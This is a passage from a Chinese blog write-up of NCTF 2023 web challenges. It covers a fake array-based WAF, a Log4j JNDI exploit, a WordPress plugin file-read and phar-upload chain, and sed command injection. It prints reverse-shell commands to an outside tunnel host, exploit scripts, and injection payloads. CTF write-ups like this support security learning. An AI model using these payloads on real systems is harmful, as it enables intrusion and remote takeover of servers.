+<p>如果指定的属性在指定的对象或其原型链中，则 <strong><code>in</code></strong> <strong>运算符</strong>返回 <code>true</code>。</p>
+</blockquote>
+<p>我们本地测试下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">const list = &#123;id:&#x27;1&#x27;,grade:&#x27;100&#x27;,name:&#x27;rev1ve&#x27;&#125;</span><br><span class="line">console.log(list)</span><br><span class="line">if(&#x27;name&#x27; in list === true)&#123;</span><br><span class="line">    console.log(&#x27;name is in list!&#x27;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行结果<br><img src="/article/NCTF2023/image-20240401201015290.png"></p>
+<p>说明指定的是属性，那如果是数组呢，给个示例</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">const banned_users = [&#x27;hacker&#x27;,&#x27;admin&#x27;]</span><br><span class="line">username=&#x27;admin&#x27;</span><br><span class="line">let test1 = (username in banned_users)</span><br><span class="line">if(test1)&#123;</span><br><span class="line">    console.log(&#x27;waffff&#x27;)</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    console.log(&#x27;success!&#x27;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>由于没有admin属性，所以test1布尔值返回为false，也就是说这是假的waf（hhh）</p>
+<p>接着往下看</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">function registerUser(username, password) &#123;</span><br><span class="line">    if (typeof username !== &quot;string&quot; || username.length &gt; 20) &#123;</span><br><span class="line">        return &quot;用户名不合法&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    if (typeof password !== &quot;string&quot; || password.length &gt; 20) &#123;</span><br><span class="line">        return &quot;密码不合法&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    if (username in users) &#123;</span><br><span class="line">        return &quot;用户已存在&quot;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    for(let existing_user in users)&#123;</span><br><span class="line">        let existing_user_password = users[existing_user]</span><br><span class="line">        if (existing_user_password === password)&#123;</span><br><span class="line">            return `您的密码已经被用户&#x27;$&#123;existing_user&#125;&#x27;使用了，请使用其它的密码`</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    users[username] = password</span><br><span class="line">    return &quot;注册成功&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>registerUser函数就是检查用户名和密码是否合法</p>
+<p>然后就是<code>/api/register</code>路由和有鉴权过程的<code>/api/login</code>路由没有什么信息，<code>/api/flag</code>路由要想得到flag就得绕过waf，以admin身份登录即可，<code>/api/ban_user</code>路由实现抛出异常</p>
+<p>整理一下思路：首先随便注册一个用户test，然后访问<code>/api/ban_user</code>路由传数组格式抛出异常绕过regex的更新，然后进行第一次访问<code>/api/flag</code>路由正则匹配成功，waf成功拦截，接着第二次访问<code>/api/flag</code>路由，正则匹配失败，成功绕过waf得到flag</p>
+<p>脚本如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">req=requests.Session()</span><br><span class="line">url=&#x27;http://117.50.175.234:9001/&#x27;</span><br><span class="line"></span><br><span class="line">req1=req.post(url+&quot;api/register&quot;,json=&#123;&quot;username&quot;:&quot;test&quot;,&quot;password&quot;:&quot;test&quot;&#125;)</span><br><span class="line">print(req1.text)</span><br><span class="line"></span><br><span class="line">req2=req.post(url+&quot;api/ban_user&quot;,json=&#123;&quot;username&quot;:&quot;test&quot;,&quot;password&quot;:&quot;test&quot;,&quot;ban_username&quot;:&#123;&quot;error&quot;:&quot;&quot;&#125;&#125;)</span><br><span class="line">print(req2.text)</span><br><span class="line"></span><br><span class="line">req3=req.post(url+&quot;api/flag&quot;,json=&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;admin&quot;&#125;)</span><br><span class="line">print(req3.text)</span><br><span class="line"></span><br><span class="line">req4=req.post(url+&quot;api/flag&quot;,json=&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;admin&quot;&#125;)</span><br><span class="line">print(req4.text)</span><br></pre></td></tr></table></figure>
+
+<p>运行结果</p>
+<p><img src="/article/NCTF2023/image-20240401201030505.png"></p>
+<h2 id="logging"><a href="#logging" class="headerlink" title="logging"></a>logging</h2><blockquote>
+<p>考点：log4j rce (CVE-2021-44228)</p>
+</blockquote>
+<p>我们将题目给的jar文件反编译一下，找到pom.xml文件<br><img src="/article/NCTF2023/image-20240401201126614.png"><br>可以知道是springboot框架，结合提示是log4j的远程RCE<br>目标就是找到注入点触发log4j的漏洞</p>
+<p><strong>参考wp</strong></p>
+<blockquote>
+<p>如何实现SpringBoot在默认配置下如何触发Log4j2 JNDI RCE（默认配置是指代码仅仅使用了Log4j2的依赖）<br>核心思路就是：构造⼀个畸形的HTTP数据包使得SpringBoot控制台报错</p>
+</blockquote>
+<p>本题利用的是http请求的Accept头，接下来就是JNDI常规注入<br>使用工具<code>rogue-jndi</code>，由于之前做的log4j漏洞是htb能出网的机子(参考文章)，所以本题需要修改下参数值<br>映射端口如下<br><img src="/article/NCTF2023/image-20240401201220929.png"><br>运行工具</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar target/RogueJndi-1.1.jar --command &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC81aTc4MTk2M3AyLnlpY3AuZnVuLzU4MjY1IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; --hostname &quot;192.168.132.128&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="/article/NCTF2023/image-20240401201235782.png"></p>
+<p>选择第三个，抓包在Accept头添加payload<br>然后修改一下ip地址（因为是内网穿透）</p>
+<p><img src="/article/NCTF2023/image-20240401201246801.png"></p>
+<p>成功反弹shell得到flag</p>
+<p><img src="/article/NCTF2023/image-20240401201329986.png"></p>
+<h2 id="ez-wordpress"><a href="#ez-wordpress" class="headerlink" title="ez_wordpress"></a>ez_wordpress</h2><p>打开题目，没什么收获看看hint</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Hint 1: 可以思考下如何对 WordPress 进行信息收集</span><br><span class="line"></span><br><span class="line">Hint 2: 注意版本 (6.4.1) 注意一些第三方的东西</span><br><span class="line"></span><br><span class="line">Hint 3: 结合信息收集和网上已有的东西就可以自己本地搭建一个类似的环境进行测试 涉及的代码审计部分其实很少</span><br><span class="line"></span><br><span class="line">Hint 4: https://wwnt.lanzout.com/iwUdK1ir03te</span><br><span class="line"></span><br><span class="line">Hint 5: upload phar + file read (ssrf) =&gt; rce</span><br><span class="line"></span><br><span class="line">Hint 6: 请不要使用 burp 的 Paste from file 功能 (存在 bug) 建议手动构造 upload.html 然后浏览器选择文件抓取上传包 或者写 python 脚本上传 或者使用 yakit </span><br></pre></td></tr></table></figure>
+
+<p>hint1应该是能通过wpscan扫出来有用的线索，刚好hint4是给的扫描结果；然后hint2说注意版本以及第三方东西，应该就是插件</p>
+<p>那么我们看一下扫描结果</p>
+<p><img src="/article/NCTF2023/image-20231229143529891.png"></p>
+<p>果然是扫出来几个插件，重点看向all-in-one-video-gallery和drag-and-drop-multiple-file-upload-contact-form-7以及对应的版本</p>
+<p>我们根据关键词搜出来all-in-one-video-gallery插件具有ssrf和文件读取漏洞并且知道对应cve漏洞编号</p>
+<p><img src="/article/NCTF2023/image-20231229140607931.png"></p>
+<p>在网上找到篇文章如何构造ssrf漏洞 <a target="_blank" rel="noopener" href="https://blog.amanrawat.in/2022/09/28/CVE-2022-2633.html">参考链接</a></p>
+<p>在<code>/index.php/video</code>路由下存在dl参数，如果不为数字则对其base64解码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public function download_video() &#123;</span><br><span class="line">if ( ! isset( $_GET[&#x27;dl&#x27;] ) ) &#123;</span><br><span class="line">	return;</span><br><span class="line">&#125;	</span><br><span class="line">		</span><br><span class="line">if ( is_numeric( $_GET[&#x27;dl&#x27;] ) ) &#123;</span><br><span class="line">	$file = get_post_meta( (int) $_GET[&#x27;dl&#x27;], &#x27;mp4&#x27;, true );</span><br><span class="line">&#125; else &#123;</span><br><span class="line">	$file = base64_decode( $_GET[&#x27;dl&#x27;] );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ( empty( $file ) ) &#123;</span><br><span class="line">	die( esc_html__( &#x27;Download file URL is empty.&#x27;, &#x27;all-in-one-video-gallery&#x27; ) );</span><br><span class="line">	exit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>接下来文章就是讲解如何触发ssrf漏洞（本文不做叙述）</p>
+<p>看向下面的<strong>利用未经身份验证的任意文件下载</strong></p>
+<p>利用代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">if ( $is_remote_file &amp;&amp; $formatted_path == &#x27;url&#x27; ) &#123;         </span><br><span class="line">	$data = @get_headers( $file, true );</span><br><span class="line">          </span><br><span class="line">	if ( ! empty( $data[&#x27;Content-Length&#x27;] ) ) &#123;</span><br><span class="line">		$file_size = (int) $data[ &#x27;Content-Length&#x27; ];          </span><br><span class="line">		&#125; else &#123;               </span><br><span class="line">			// If get_headers fails then try to fetch fileSize with curl</span><br><span class="line">			$ch = @curl_init();</span><br><span class="line">			if ( ! @curl_setopt( $ch, CURLOPT_URL, $file ) ) &#123;</span><br><span class="line">            	@curl_close( $ch );</span><br><span class="line">            	@exit;</span><br><span class="line">        	&#125;</span><br><span class="line">               </span><br><span class="line">        	@curl_setopt( $ch, CURLOPT_NOBODY, true );</span><br><span class="line">        	@curl_setopt( $ch, CURLOPT_RETURNTRANSFER, true );</span><br><span class="line">        	@curl_setopt( $ch, CURLOPT_HEADER, true );</span><br><span class="line">        	@curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, true );</span><br><span class="line">        	@curl_setopt( $ch, CURLOPT_MAXREDIRS, 3 );</span><br><span class="line">        	@curl_setopt( $ch, CURLOPT_CONNECTTIMEOUT, 10 );</span><br><span class="line">        	@curl_exec( $ch );</span><br><span class="line">               </span><br><span class="line">			if ( ! @curl_errno( $ch ) ) &#123;</span><br><span class="line">				$http_status = (int) @curl_getinfo( $ch, CURLINFO_HTTP_CODE );</span><br><span class="line">				if ( $http_status &gt;= 200 &amp;&amp; $http_status &lt;= 300 )&#123;</span><br><span class="line">					$file_size = (int) @curl_getinfo( $ch, CURLINFO_CONTENT_LENGTH_DOWNLOAD );</span><br><span class="line">				&#125;</span><br><span class="line">				@curl_close( $ch );</span><br><span class="line">        	&#125;</span><br><span class="line">		&#125;</span><br><span class="line">&#125;else&#123;	</span><br><span class="line">	$chunk = 1 * ( 1024 * 1024 );</span><br><span class="line">	$nfile = @fopen( $file, &#x27;rb&#x27; );</span><br><span class="line">	while ( ! feof( $nfile ) ) &#123;                 </span><br><span class="line">		print( @fread( $nfile, $chunk ) );</span><br><span class="line">    	@ob_flush();</span><br><span class="line">    	@flush();</span><br><span class="line">&#125;</span><br><span class="line">@fclose( $filen );</span><br></pre></td></tr></table></figure>
+
+<p>如果<code>is_remote_file</code>为真，<code>formatted_path</code>等于url，那么将使用 cURL 库发出请求，否则如果将使用“fopen”函数来读取文件。</p>
+<p>我们看一下如何实现，<code>&amp;&amp;</code>运算符只要第一个为假表达式即为假，所以目的是让<code>is_remote_file</code>为假</p>
+<p>看向下面这段代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">if ( strpos( $file, home_url() ) !== false ) &#123;</span><br><span class="line">	$is_remote_file = false;</span><br><span class="line">&#125;		        		</span><br><span class="line">          </span><br><span class="line">if ( preg_match( &#x27;#http://#&#x27;, $file ) || preg_match( &#x27;#https://#&#x27;, $file ) ) &#123;</span><br><span class="line">    $formatted_path = &#x27;url&#x27;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">	$formatted_path = &#x27;filepath&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ( $is_remote_file ) &#123;</span><br><span class="line">	$formatted_path = &#x27;url&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>第一个 if 语句检查 $file 变量中<code>home_url()</code>的出现，其中file变量是dl参数的值，<code>home_url</code>是 WordPress 安装的完整 URL。</p>
+<p>如果dl参数具有 WordPress 路径的 URL，则<code>is_remote_file</code>的值将为false。</p>
+<p>也就是说我们可以通过file等协议读取文件，并添加有效的url路径，例如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file://http://xxx.com/index.php</span><br></pre></td></tr></table></figure>
+
+<p>最后再base64编码一下即可</p>
+<p>我们已经分析完怎么文件读取，结合hint5那么接下来就是如何上传phar文件</p>
+<p>根据关键词和版本信息找到插件drag-and-drop-multiple-file-upload-contact-form-7具有XSS漏洞（本质是可以未授权上传图片）</p>
+<p><a target="_blank" rel="noopener" href="https://wpscan.com/vulnerability/1b849957-eaca-47ea-8f84-23a3a98cc8de/">参考文章</a></p>
+<blockquote>
+<p>至于为什么思路是上传phar文件，我们结合前文分析的漏洞可以知道用协议去读取文件，当然包括phar协议</p>
+</blockquote>
+<p><img src="/article/NCTF2023/image-20231229143821345.png"></p>
+<p>这篇文章直接就给了POC，大概意思就是在<code>/wp-admin/admin-ajax.php</code>路径进行文件上传，我们把该poc中的xss内容换成我们phar文件内容即可</p>
+<p>那么我们先生成用来RCE的phar文件，直接用工具phpggc生成反弹shell文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./phpggc WordPress/RCE2 system &quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/5i781963p2.yicp.fun/58265 0&gt;&amp;1&#x27;&quot; -p phar -o ~/payload.phar</span><br></pre></td></tr></table></figure>
+
+<p>在题目访问<code>/wp-admin/admin-ajax.php</code>抓包</p>
+<p>将poc复制上去，修改下文件名为4.jpg以及文件内容为phar（右键从文件粘贴）</p>
+<p><img src="/article/NCTF2023/image-20231229201808140.png"></p>
+<p>测试后发现也能弹shell，不会出现二进制数据格式错误</p>
+<p>当然也可以用python脚本上传文件（按照poc改的）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &#x27;http://124.71.184.68:8012/wp-admin/admin-ajax.php&#x27;</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    &#x27;Accept&#x27;: &#x27;application/json, text/javascript, */*; q=0.01&#x27;,</span><br><span class="line">    &#x27;Accept-Language&#x27;: &#x27;en-GB,en;q=0.5&#x27;,</span><br><span class="line">    &#x27;Accept-Encoding&#x27;: &#x27;gzip, deflate&#x27;,</span><br><span class="line">    &#x27;X-Requested-With&#x27;: &#x27;XMLHttpRequest&#x27;,</span><br><span class="line">    &#x27;Connection&#x27;: &#x27;close&#x27;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">    &#x27;size_limit&#x27;: (None, &#x27;10485760&#x27;),</span><br><span class="line">    &#x27;action&#x27;: (None, &#x27;dnd_codedropz_upload&#x27;),</span><br><span class="line">    &#x27;type&#x27;: (None, &#x27;click&#x27;),</span><br><span class="line">    &#x27;upload-file&#x27;: (&#x27;1.jpg&#x27;, open(&#x27;payload.phar&#x27;, &#x27;rb&#x27;), &#x27;image/jpeg&#x27;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(url, headers=headers, files=files)</span><br><span class="line"></span><br><span class="line">print(response.status_code)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure>
+
+<p>成功上传</p>
+<p><img src="/article/NCTF2023/image-20231229201102713.png"></p>
+<p>然后就是文件读取，将payload编码一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phar:///var/www/html/wp-content/uploads/wp_dndcf7_uploads/wpcf7-files/1.jpg/test.txt</span><br></pre></td></tr></table></figure>
+
+<p>注意phar url的结尾必须加上 <code>/test.txt</code> ,因为在构造phar文件的时候执行的是 <code>$phar-addFromString(&quot;test.txt&quot;, &quot;test&quot;);</code> ,这里的路径需要与代码中的test.txt对应,否则网站会⼀直卡住</p>
+<p>访问<code>/index.php/video</code>并传递参数dl去phar读取文件</p>
+<p><img src="/article/NCTF2023/image-20231229201131924.png"></p>
+<p>成功反弹shell</p>
+<p><img src="/article/NCTF2023/image-20231229201213786.png"></p>
+<p>尝试suid提权，发现可用命令</p>
+<p><img src="/article/NCTF2023/image-20231229201305498.png"></p>
+<p>查找一下date命令如何提权</p>
+<p><img src="/article/NCTF2023/image-20231229201648495.png"></p>
+<p>得到flag</p>
+<p><img src="/article/NCTF2023/image-20231229201621224.png"></p>
+<h2 id="Webshell-Generator"><a href="#Webshell-Generator" class="headerlink" title="Webshell Generator"></a>Webshell Generator</h2><blockquote>
+<p>考点：sed命令</p>
+</blockquote>
+<p>打开题目，大概意思就是可以生成webshell并下载下来<br><img src="/article/NCTF2023/image-20240401201433227.png"></p>
+<p>hint1给了附件，直接代码审计<br>index.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function security_validate()</span><br><span class="line">&#123;</span><br><span class="line">    foreach ($_POST as $key =&gt; $value) &#123;</span><br><span class="line">        if (preg_match(&#x27;/\r|\n/&#x27;, $value)) &#123;</span><br><span class="line">            die(&quot;$key 不能包含换行符！&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        if (strlen($value) &gt; 114) &#123;</span><br><span class="line">            die(&quot;$key 不能超过114个字符！&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">security_validate();</span><br><span class="line">if (@$_POST[&#x27;method&#x27;] &amp;&amp; @$_POST[&#x27;key&#x27;] &amp;&amp; @$_POST[&#x27;filename&#x27;]) &#123;</span><br><span class="line">    if ($_POST[&#x27;language&#x27;] !== &#x27;PHP&#x27;) &#123;</span><br><span class="line">        die(&quot;PHP是最好的语言&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $method = $_POST[&#x27;method&#x27;];</span><br><span class="line">    $key = $_POST[&#x27;key&#x27;];</span><br><span class="line">    putenv(&quot;METHOD=$method&quot;) or die(&quot;你的method太复杂了！&quot;);</span><br><span class="line">    putenv(&quot;KEY=$key&quot;) or die(&quot;你的key太复杂了！&quot;);</span><br><span class="line">    $status_code = -1;</span><br><span class="line">    $filename = shell_exec(&quot;sh generate.sh&quot;);</span><br><span class="line">    if (!$filename) &#123;</span><br><span class="line">        die(&quot;生成失败了！&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $filename = trim($filename);</span><br><span class="line">    header(&quot;Location: download.php?file=$filename&amp;filename=&#123;$_POST[&#x27;filename&#x27;]&#125;&quot;);</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>POST传参接收三个参数，如果参数language不为php，那么分别设置环境变量METHOD和KEY，执行generate.sh文件并赋值给filename，然后跳转到download.php进行文件下载</p>
+<p>我们可以抓包看一下<br><img src="/article/NCTF2023/image-20240401201504690.png"></p>
+<p>当我们直接访问的话可以读取到该生成的文件<br>也就是说存在任意文件读取</p>
+<p><img src="/article/NCTF2023/image-20240401201553160.png"></p>
+<p>根据hint提示我们要读取<code>/readflag</code>，我们分析一下如何读取<br>按照刚刚的测试，读取的文件路径是由<code>$filename = shell_exec(&quot;sh generate.sh&quot;);</code>决定，那么我们跟进一下<br>generate.sh</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line"></span><br><span class="line">set -e</span><br><span class="line"></span><br><span class="line">NEW_FILENAME=$(tr -dc a-z0-9 &lt;/dev/urandom | head -c 16)</span><br><span class="line">cp template.php &quot;/tmp/$NEW_FILENAME&quot;</span><br><span class="line">cd /tmp</span><br><span class="line"></span><br><span class="line">sed -i &quot;s/KEY/$KEY/g&quot; &quot;$NEW_FILENAME&quot;</span><br><span class="line">sed -i &quot;s/METHOD/$METHOD/g&quot; &quot;$NEW_FILENAME&quot;</span><br><span class="line"></span><br><span class="line">realpath &quot;$NEW_FILENAME&quot;</span><br></pre></td></tr></table></figure>
+<p>可以发现是使用sed命令的<code>-i</code>参数，我们查找下</p>
+<p><img src="/article/NCTF2023/image-20240401201614723.png"></p>
+<p>可以编辑文件内容，而<code>s/KEY/$KEY/g</code> 是 sed 命令的替换操作部分<br>也就是说生成的webshell中会替换两个值<br><img src="/article/NCTF2023/image-20240401201639360.png"></p>
+<p>sed命令中可以用<code>;</code>来分隔指令，e参数用来命令执行<br>我们在参数key的地方注入，前后闭合即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/g;e /readflag;s/</span><br></pre></td></tr></table></figure>
+<p>至于为什么是e而不是-e，解释如下</p>
+<blockquote>
+<p>GNU sed中的sed -i s&#x2F;hello&#x2F;g;e &#x2F;readflag命令中的e参数是用来执行一个外部命令的。在这个命令中，e参数后面跟着的是一个外部命令&#x2F;readflag，它会被sed执行在sed命令中，-e参数用于指定一个或多个sed脚本命令，而-i参数用于直接修改文件内容。因此，我们想要在sed命令中执行一个外部命令，我们需要使用e参数而不是-e参数</p>
+</blockquote>
+<p><img src="/article/NCTF2023/image-20240401201711511.png"></p>
+<p>然后再访问得到flag</p>
+<p><img src="/article/NCTF2023/image-20240401201729069.png"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/article/Upload-labs%E9%9D%B6%E5%9C%BA.html" rel="prev" title="Upload-labs靶场">
+      <i class="fa fa-chevron-left"></i> Upload-labs靶场
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/article/%E5%8D%9A%E5%AE%A2%E5%B8%B8%E7%94%A8%E8%AE%BE%E7%BD%AE.html" rel="next" title="博客常用设置">
+      博客常用设置 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#NCTF-2023-web%E8%A7%A3%E6%9E%90"><span class="nav-number">1.</span> <span class="nav-text">[NCTF 2023]web解析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#WaitWhat"><span class="nav-number">1.1.</span> <span class="nav-text">WaitWhat?</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#logging"><span class="nav-number">1.2.</span> <span class="nav-text">logging</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ez-wordpress"><span class="nav-number">1.3.</span> <span class="nav-text">ez_wordpress</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Webshell-Generator"><span class="nav-number">1.4.</span> <span class="nav-text">Webshell Generator</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="rev1ve"
+      src="/images/1.jpg">
+  <p class="site-author-name" itemprop="name">rev1ve</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">73</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
